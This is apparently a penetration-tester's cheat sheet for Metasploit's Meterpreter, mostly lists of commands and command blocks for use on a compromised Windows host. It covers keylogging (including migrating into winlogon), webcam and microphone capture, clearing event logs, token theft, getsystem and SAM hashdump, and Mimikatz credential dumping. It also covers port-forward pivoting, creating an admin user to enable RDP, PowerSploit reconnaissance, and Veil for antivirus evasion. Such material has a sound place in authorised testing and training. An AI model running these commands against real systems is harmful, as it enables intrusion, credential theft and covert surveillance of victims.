# Meterpreter Basics

Meterpreter is a shell on steroids, stealthy, extensible, powerful. It offers much more than a basic shell. Allows the following :

* Obtain system information
* Upload and download files
* Open system command shell
* Multitasking abilities by creating multiple sessions
* Dump password hashes
* Relay TCP connections with portfwd
* Capture keystrokes
* Migrate between processes
* Clear system logs
* Dump webcam snapshots
* Perform post exploitation

## Stealth

It typically goes unnoticed - it does not create a new shell, but embeds itself into a running process on the remote host. Resides entirely in memory, and uses TLS for communication. That said, the payloads are well known among AV vendors, and it's hard to obfuscate payloads to not be detected. New modern technologies can detect meterpreter in memory. Keeping your payloads truly stealthy, you can use [Veil](https://github.com/Veil-Framework/Veil)

### Core Commands

Core commands are the most basic commands and are used to interact with Meterpreter. The core commands category contains the following commands:

- **?**: Displays the help menu.
- **background**: Moves the current session to the background.
- **bgkill**: Kills a background meterpreter script.
- **bglist**: Provides a list of all running background scripts.
- **bgrun**: Runs a script as a background thread.
- **channel**: Displays active channels.
- **close**: Closes a channel.
- **exit**: Terminates a meterpreter session.
- **help**: Displays the help menu.
- **interact**: Interacts with a channel.
- **irb**: Go into Ruby scripting mode.
- **migrate**: Moves the active process to a designated PID.
- **quit**: Terminates the meterpreter session.
- **read**: Reads the data from a channel.
- **run**: Executes the meterpreter script designated after it.
- **use**: Loads a meterpreter extension.
- **write**: Writes data to a channel.

### File System Commands

The file system commands are used to interact with the file system:

- **cat**: Read and output to stdout the contents of a file.
- **cd**: Change directory on the victim.
- **del**: Delete a file on the victim.
- **download**: Download a file from the victim system to the attacker system.
- **edit**: Edit a file with vim.
- **getlwd**: Print the local directory.
- **getwd**: Print working directory.
- **lcd**: Change local directory.
- **lpwd**: Print local directory.
- **ls**: List files in current directory.
- **mkdir**: Make a directory on the victim system.
- **pwd**: Print working directory.
- **rm**: Delete a file.
- **rmdir**: Remove directory on the victim system.
- **upload**: Upload a file from the attacker system to the victim.

### Networking Commands

The networking commands are used to retrieve information about network interfaces, view and modify routes and to forward port on the target system:

- **ipconfig**: Displays network interfaces with key information including IP address, etc.
- **portfwd**: Forwards a port on the victim system to a remote service.
- **route**: View or modify the victim routing table.

### System Commands

The system commands interact with the target system and include commands to retrieve system information, open a command shell and to interact with running processes:

- **clearav**: Clears the event logs on the victim’s computer.
- **drop_token**: Drops a stolen token.
- **execute**: Executes a command.
- **getpid**: Gets the current process ID (PID).
- **getprivs**: Gets as many privileges as possible.
- **getuid**: Get the user that the server is running as.
- **kill**: Terminate the process designated by the PID.
- **ps**: List running processes.
- **reboot**: Reboots the victim computer.
- **reg**: Interact with the victim’s registry.
- **rev2self**: Calls RevertToSelf() on the victim machine.
- **shell**: Opens a command shell on the victim machine.
- **shutdown**: Shuts down the victim’s computer.
- **steal_token**: Attempts to steal the token of a specified (PID) process.
- **sysinfo**: Gets the details about the victim computer such as OS and name.

### User Interface Commands

The user interface commands interact with the user interface of the target system. In this category you will find commands to enumerate accessible desktops, record keystrokes and make screenshots:

- **enumdesktops**: Lists all accessible desktops.
- **getdesktop**: Get the current meterpreter desktop.
- **idletime**: Checks to see how long since the victim system has been idle.
- **keyscan_dump**: Dumps the contents of the software keylogger.
- **keyscan_start**: Starts the software keylogger when associated with a process such as Word or browser.
- **keyscan_stop**: Stops the software keylogger.
- **screenshot**: Grabs a screenshot of the meterpreter desktop.
- **set_desktop**: Changes the meterpreter desktop.
- **uictl**: Enables control of some of the user interface components.

### Webcam Commands

The webcam commands interact with the video and audio devices of the target system. These commands can list present webcams, record the webcam and microphone and take snapshots from the webcam.

- **record_mic**: Record audio from the default microphone for X seconds.
- **webcam_chat**: Start a video chat.
- **webcam_list**: List webcams.
- **webcam_snap**: Take a snapshot from the specified webcam.
- **webcam_stream**: Play a video stream from the specified webcam.

### Privilege Escalation Commands

The privilege escalation commands are used for privilege escalation purposes, such as dumping the SAM table and performing different methods to gain system privileges:

- **getsystem**: Uses 15 built-in methods to gain sysadmin privileges.
- **hashdump**: Grabs the hashes in the password (SAM) file.
- **timestamp**: Manipulates the modify, access, and create attributes of a file.

### Meterpreter Commands

`sysinfo` - useful information about the target. 
`getuid` - Username of the current process meterpreter is embedded in
`show_mount` - Shows any connected shares, physical / networked
`idletime` - Total time the user has been inactive
`shell` - Access the command prompt of the host - creates a new process
:exclamation: - If `sh` is not available, you can run `execute -i -f /system/bin/sh`
`ps` - Lists all running processes
`migrate` - Switches the process to another - used for stability or privilege level
`search` - Searches the filesystem for specific terms
`pwd` - present directory on target
`lpwd` - working directory on the local host controlling meterpreter
`upload` - uploads a <file> to the <target path>
`getsystem` - Attempts number of methods to gain admin privileges on remote host
`hashdump` - Dumps contents of the SAM database; meterpreter must reside in a process with SYSTEM privs

> Migrate to lsass.exe which has sys-privileges 
> ps - to list processes
> migrate [lsass PID]
> hashdump

### Recording Keystrokes and Screenshots

`keyscan_start` to record all keystrokes in the process that metepreter resides in. 
If we want to record keystrokes of a user that logs onto the remote machine, we can migrate meterpreter to the winlogon.exe process. 
`keyscan_stop` - stops recording
`keyscan_dump` - dumps recorded keystrokes
`screenshot` - takes a screenshot of the desktop  

### Port forwarding

Can be used to pivot and access networks through the comrpomised machines that are otherwise inaccessible. This will allow us to relay to a local port that is not accessible remotely, such as RDP. 

```bash
portfwd add -l 3389 -p 3389 -r [target host]
# -l 3389 - local port listening and forwarded ; a port on your local machine
# -p 3389 - destination port on the target
# -r [target host] - target host by IP or hostname
# Lists all the tunnels
portfwd list 
# To remove a tunnel
portfwd delete -l 3389 -p 3389 -r [target host]
# To remove all tunnels
portfwd flush
# Initiate a remote desktop session local 3389 through the tunnel
rdesktop 127.0.0.1:3389
```

### Metasploit Post-exploitation

We can enable remote desktop using post-exploitation.  Lets use `post/windows/manage/enable_rdp`. 
Our starting point is a meterpreter shell with administrative privileges on a Windows system. 

```bash
# Background the meterpreter sessiom
background
# Activate enable_rdp module
use post/windows/manage/enable_rdp
set username admin 		# Create a new user name admin
set password password # Create a password 
set session 1					# Ony compatible with an active session
run
# Connect using remote desktop
rdesktop 10.11.1.109

# Shortcut way
run post/windows/manage/enable_rdp username=admin,password=password
```

### Meterpreter Mimikatz

In order to run Mimikatz and interact with the lsass process, the shell needs SYSTEM privileges. 
`getsystem` - Gain SYSTEM perms
Next we need to load the mimikatz script:
`load mimikatz` 
`help mimikatz` - see commands for the features of Mimikatz - reading passwords and memory

```bash
# Starting with Kerberos Meterpret Functions
kerberos # Retrieves kerberos credentials
msv 		 # Retrieves msv credentials
wdigest	 # Retrieves wdigest credentials
# mimikatz_command -f version
mimikatz_command -f help:: # Lists available mimikatz modules
mimikatz_command -f [Module Name]::
# Print options for sekurlsa
mimikatz_command -f sekurlsa::
# Since we retrieves credentials already with wdigest, can pass to sekurlsa
mimikatz_command -f sekurlsa::wdigest
```

More details on Mimikatz can be found [here](https://github.com/gentilkiwi/mimikatz/wiki)

### PowerShell on Meterpreter

If the target supports PowerShell 2.0, you can run `load powershell`. 
If the target does not support PowerShell 2.0 engine, you'll need to use the PowerShell reverse shell payload. 
With the extension loaded, we can run `help` and see three additional commands:

* powershell_execute # Execute a Powershell command string
* powershell_import.  # Import a PS1 script .NET assembly DLL
* powershell_shell.     # Create an interactive Powershell prompt

```bash
powershell_execute "$PSVersionTable"
# Import a script or assembly to the target - must end in .ps1 or .dll
# https://github.com/PowerShellMafia/PowerSploit/ which is a PowerShell Post-Exploitation Framework
powershell_import "/root/Desktop/PowerSploit/Recon/PowerView.ps1"
# Now we can execute / invoke PowerView
powershell_execute Get-NetDomain
# Get the logged on users
powershell_execute Get-NetLoggedon
# Get an interactive powershell shell
powershell_shell
# With previous imported scripts, we can access the functions
Get-CachedRDPConnection
```

https://github.com/PowerShellMafia/PowerSploit

https://powersploit.readthedocs.io/en/latest
